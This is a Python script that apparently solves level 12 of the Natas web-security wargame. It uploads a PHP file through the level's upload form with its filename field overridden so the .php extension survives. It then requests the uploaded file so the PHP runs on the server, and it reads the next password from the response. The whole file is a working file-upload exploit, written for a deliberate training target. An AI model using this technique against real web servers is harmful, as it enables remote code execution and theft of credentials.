import re

from config import password_length, assets_folder
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 12


def get_secret():
    with open(f"{assets_folder}/natas12.php", "rb") as file:
        req = get_request_object(level_number)
        result = req.post(get_level_url(level_number), data={"filename": "natas12.php"}, files={"uploadedfile": file})
        pattern = "<[^<]+?>"
        text = re.sub(pattern, "", result.text)
        search = "The file"

        if search in text:
            start_index = text.find(search) + len(search) + 1
            end_index = text.find(".php")
            file_path = text[start_index: end_index] + ".php"
            result = req.get(get_level_url(level_number) + "/" + file_path)
            return result.text[:password_length]

    return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)